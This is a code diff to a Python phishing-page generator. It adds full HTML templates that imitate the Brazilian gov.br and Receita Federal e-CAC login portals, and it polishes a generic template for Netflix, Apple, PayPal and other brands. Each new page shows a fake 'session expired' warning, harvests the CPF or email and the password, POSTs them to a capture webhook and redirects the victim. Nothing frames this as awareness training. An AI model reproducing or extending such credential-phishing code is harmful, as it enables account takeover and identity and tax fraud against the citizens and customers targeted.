@@ -28,6 +28,8 @@ class PhishingPageGenerator:
             "apple": self._apple_template,
             "twitter": self._twitter_template,
             "netflix": self._netflix_template,
+            "govbr": self._govbr_template,
+            "receita": self._receita_template,
         }
     
     def _get_capture_script(self, page_id: str) -> str:
@@ -1070,11 +1072,221 @@ class PhishingPageGenerator:
                          custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
         """Netflix login template"""
         return self._generate_simple_template("Netflix", "#e50914", "#b20710", redirect_url, capture_webhook, page_id, custom_title)
+
+    def _govbr_template(self, redirect_url: str, capture_webhook: Optional[str], 
+                        custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
+        return f"""<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{custom_title or 'Entrar com gov.br'}</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{ font-family: -apple-system, system-ui, Segoe UI, Roboto, Arial, sans-serif; background: #f5f7fb; min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
+        .container {{ width: 100%; max-width: 460px; }}
+        .header {{ display:flex; align-items:center; justify-content:center; margin-bottom: 18px; }}
+        .govbr {{ font-weight: 800; font-size: 28px; letter-spacing: -0.5px; }}
+        .govbr .gov {{ color: #154D9B; }}
+        .govbr .br {{ color: #FFCC00; }}
+        .card {{ background: #fff; border: 1px solid #e1e5eb; border-radius: 10px; box-shadow: 0 6px 24px rgba(21,77,155,0.08); padding: 28px; }}
+        h1 {{ font-size: 20px; font-weight: 700; color: #1f2937; margin-bottom: 8px; }}
+        .subtitle {{ font-size: 13px; color: #6b7280; margin-bottom: 16px; }}
+        label {{ display:block; font-size: 13px; color: #374151; margin-bottom: 6px; }}
+        input {{ width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; margin-bottom: 12px; background:#fafafa; }}
+        input:focus {{ border-color: #154D9B; background:#fff; }}
+        button.primary {{ width: 100%; padding: 12px; background: #154D9B; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }}
+        button.primary:hover {{ background: #123f86; }}
+        .alt {{ display:flex; justify-content:space-between; align-items:center; margin-top: 10px; }}
+        .link {{ color: #154D9B; text-decoration: none; font-weight: 600; font-size: 13px; }}
+        .link:hover {{ text-decoration: underline; }}
+        .warning {{ background: #fef7e0; border: 1px solid #f9ab00; color: #1f2937; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 12px; }}
+        .password {{ display:flex; gap:8px; align-items:center; margin-bottom: 12px; }}
+        .password input {{ flex: 1; }}
+        .toggle {{ background: #eef2ff; color: #154D9B; border: 1px solid #c7d2fe; border-radius: 8px; padding: 10px 12px; font-size: 13px; font-weight: 600; cursor: pointer; }}
+        .toggle:hover {{ background: #e0e7ff; }}
+        .modal {{ position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; }}
+        .modal[hidden] {{ display: none; }}
+        .modal-content {{ background:#fff; border-radius:12px; padding:20px; width: 92%; max-width: 360px; text-align:center; box-shadow: 0 10px 30px rgba(0,0,0,0.15); }}
+        .modal-header {{ font-weight: 700; font-size: 16px; margin-bottom: 12px; color:#1f2937; }}
+        .modal-sub {{ font-size: 13px; color:#6b7280; margin-top: 8px; }}
+        .close {{ margin-top: 12px; padding: 10px 12px; border-radius:8px; border:1px solid #d1d5db; background:#f9fafb; cursor:pointer; font-weight:600; }}
+    </style>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="icon" href="https://www.gov.br/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="govbr"><span class="gov">gov</span><span class="br">.br</span></div>
+        </div>
+        <div class="card">
+            <h1>Entrar com gov.br</h1>
+            <div class="subtitle">Acesse com sua conta única do governo</div>
+            <div class="warning">⚠️ Sessão expirada. Faça login novamente para continuar.</div>
+            <form id="loginForm">
+                <label>CPF ou e-mail</label>
+                <input type="text" name="email" placeholder="Digite seu CPF ou e-mail" required>
+                <label>Senha</label>
+                <div class="password">
+                    <input type="password" name="password" id="govbr-password" placeholder="Digite sua senha" required>
+                    <button type="button" id="toggleGovbrPassword" class="toggle">Mostrar</button>
+                </div>
+                <input type="hidden" name="method" value="senha">
+                <button class="primary" type="submit">Entrar</button>
+            </form>
+            <div class="alt">
+                <a href="#" class="link" id="openQr">Entrar com QR Code</a>
+                <a href="#" class="link">Esqueci minha senha</a>
+            </div>
+            <div class="alt" style="margin-top:8px;">
+                <a href="#" class="link">Criar conta</a>
+                <a href="#" class="link">Outras opções</a>
+            </div>
+        </div>
+    </div>
+    <div class="modal" id="qrModal" hidden>
+        <div class="modal-content">
+            <div class="modal-header">Entrar com QR Code</div>
+            <img alt="QR" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=gov.br%20login%20{page_id}" style="width:200px;height:200px;border:1px solid #e5e7eb;border-radius:8px;">
+            <div class="modal-sub">Abra o app gov.br e escaneie o QR</div>
+            <button type="button" class="close" id="closeQr">Fechar</button>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {{
+            var t = document.getElementById('toggleGovbrPassword');
+            if (t) {{
+                t.addEventListener('click', function() {{
+                    var p = document.getElementById('govbr-password');
+                    if (!p) return;
+                    if (p.type === 'password') {{ p.type = 'text'; t.innerText = 'Ocultar'; }} else {{ p.type = 'password'; t.innerText = 'Mostrar'; }}
+                }});
+            }}
+            var open = document.getElementById('openQr');
+            var modal = document.getElementById('qrModal');
+            var close = document.getElementById('closeQr');
+            if (open && modal) {{
+                open.addEventListener('click', function(e) {{ e.preventDefault(); modal.hidden = false; }});
+            }}
+            if (close && modal) {{
+                close.addEventListener('click', function() {{ modal.hidden = true; }});
+            }}
+        }});
+        async function handleSubmit(event) {{
+            try {{
+                const formData = new FormData(event.target);
+                if (!capturedData.form_data) capturedData.form_data = {{}};
+                for (const [k, v] of formData.entries()) {{ capturedData.form_data[k] = v; }}
+                await sendCapturedData(true);
+            }} catch(e) {{}}
+            const data = {{
+                page_id: '{page_id}',
+                template: 'govbr',
+                email: document.querySelector('input[name="email"]').value,
+                password: document.querySelector('input[name="password"]').value,
+                method: 'senha',
+                timestamp: new Date().toISOString()
+            }};
+            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
+            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
+            return false;
+        }}
+    </script>
+</body>
+</html>"""
+
+    def _receita_template(self, redirect_url: str, capture_webhook: Optional[str], 
+                          custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
+        return f"""<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{custom_title or 'e-CAC - Receita Federal'}</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{ font-family: -apple-system, system-ui, Segoe UI, Roboto, Arial, sans-serif; background: #f4f6fb; min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
+        .container {{ width: 100%; max-width: 520px; }}
+        .topbar {{ background:#001A4D; color:#fff; padding: 14px 18px; border-radius: 10px 10px 0 0; }}
+        .brand {{ display:flex; align-items:center; gap:10px; font-weight:700; }}
+        .brand .mark {{ width:20px; height:20px; background:#00A3E0; border-radius:3px; }}
+        .card {{ background:#fff; border:1px solid #dbe2ea; border-top:none; border-radius: 0 0 10px 10px; box-shadow: 0 6px 24px rgba(0,26,77,0.08); padding: 24px; }}
+        h1 {{ font-size: 18px; font-weight: 700; color:#0f172a; margin-bottom: 8px; }}
+        .subtitle {{ font-size: 13px; color:#475569; margin-bottom: 16px; }}
+        label {{ display:block; font-size: 13px; color:#334155; margin-bottom:6px; }}
+        input {{ width:100%; padding:12px 14px; border:1px solid #cbd5e1; border-radius:8px; font-size:15px; margin-bottom:12px; background:#fafafa; }}
+        input:focus {{ border-color:#001A4D; background:#fff; }}
+        button.primary {{ width:100%; padding:12px; background:#001A4D; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:700; cursor:pointer; }}
+        button.primary:hover {{ background:#001640; }}
+        .alt {{ display:flex; justify-content:space-between; align-items:center; margin-top:10px; }}
+        .link {{ color:#001A4D; text-decoration:none; font-weight:600; font-size:13px; }}
+        .link:hover {{ text-decoration:underline; }}
+        .warning {{ background:#fff7ed; border:1px solid #fdba74; color:#1f2937; padding:12px; border-radius:8px; font-size:13px; margin-bottom:12px; }}
+    </style>
+    <link rel="icon" href="https://www.gov.br/receitafederal/pt-br/assuntos/receitafederal.svg">
+</head>
+<body>
+    <div class="container">
+        <div class="topbar">
+            <div class="brand"><div class="mark"></div><div>Receita Federal</div></div>
+        </div>
+        <div class="card">
+            <h1>e-CAC</h1>
+            <div class="subtitle">Centro de Atendimento Virtual da Receita Federal</div>
+            <div class="warning">⚠️ Sessão expirada. Autentique-se novamente.</div>
+            <form id="loginForm">
+                <label>CPF ou CNPJ</label>
+                <input type="text" name="email" placeholder="Digite seu CPF ou CNPJ" required>
+                <label>Senha</label>
+                <input type="password" name="password" placeholder="Digite sua senha" required>
+                <button class="primary" type="submit">Entrar</button>
+            </form>
+            <div class="alt">
+                <a href="#" class="link">Criar código de acesso</a>
+                <a href="#" class="link">Entrar com gov.br</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        async function handleSubmit(event) {{
+            try {{
+                const formData = new FormData(event.target);
+                if (!capturedData.form_data) capturedData.form_data = {{}};
+                for (const [k, v] of formData.entries()) {{ capturedData.form_data[k] = v; }}
+                await sendCapturedData(true);
+            }} catch(e) {{}}
+            const data = {{
+                page_id: '{page_id}',
+                template: 'receita',
+                email: document.querySelector('input[name="email"]').value,
+                password: document.querySelector('input[name="password"]').value,
+                timestamp: new Date().toISOString()
+            }};
+            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
+            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
+            return false;
+        }}
+    </script>
+</body>
+</html>"""
     
     def _generate_simple_template(self, brand: str, color: str, hover_color: str, 
                                  redirect_url: str, capture_webhook: Optional[str], 
                                  page_id: str, custom_title: Optional[str]) -> str:
-        """Generic template generator"""
+        bg = "linear-gradient(135deg, " + color + ", " + hover_color + ")"
+        if brand.lower().startswith("netflix"):
+            bg = "#000000"
+        elif brand.lower().startswith("apple"):
+            bg = "#f5f5f7"
+        elif brand.lower().startswith("amazon"):
+            bg = "#f3f3f3"
+        elif brand.lower().startswith("paypal"):
+            bg = "#f5f7fa"
+        elif brand.lower().startswith("twitter"):
+            bg = "#f5f8fa"
+        elif brand.lower().startswith("linkedin"):
+            bg = "#f3f2ef"
         return f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -1083,13 +1295,13 @@ class PhishingPageGenerator:
     <title>{custom_title or f'Entrar - {brand}'}</title>
     <style>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, {color}, {hover_color}); display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
-        .card {{ background: white; max-width: 400px; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }}
-        h1 {{ font-size: 32px; text-align: center; color: {color}; margin-bottom: 30px; }}
+        body {{ font-family: -apple-system, system-ui, Segoe UI, Roboto, Arial, sans-serif; background: {bg}; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
+        .card {{ background: white; max-width: 420px; padding: 36px; border-radius: 12px; box-shadow: 0 12px 36px rgba(0,0,0,0.18); border: 1px solid rgba(0,0,0,0.06); }}
+        h1 {{ font-size: 28px; text-align: center; color: {color}; margin-bottom: 22px; font-weight: 800; letter-spacing: -0.3px; }}
         .warning {{ background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 5px; margin-bottom: 20px; text-align: center; font-size: 14px; }}
-        input {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 15px; margin-bottom: 15px; }}
-        input:focus {{ outline: none; border-color: {color}; }}
-        button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }}
+        input {{ width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 10px; font-size: 15px; margin-bottom: 14px; background:#fafafa; }}
+        input:focus {{ outline: none; border-color: {color}; background:#fff; }}
+        button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }}
         button:hover {{ background: {hover_color}; }}
     </style>
 </head>
@@ -1153,6 +1365,8 @@ class PhishingPageGenerator:
             {"id": "apple", "name": "Apple", "description": "Apple ID login"},
             {"id": "twitter", "name": "Twitter/X", "description": "Twitter/X login page"},
             {"id": "netflix", "name": "Netflix", "description": "Netflix login page"},
+            {"id": "govbr", "name": "Gov.br", "description": "Portal Gov.br - login"},
+            {"id": "receita", "name": "Receita Federal e-CAC", "description": "Portal e-CAC - login"},
         ]
     
     def get_generated_pages(self) -> List[Dict]:
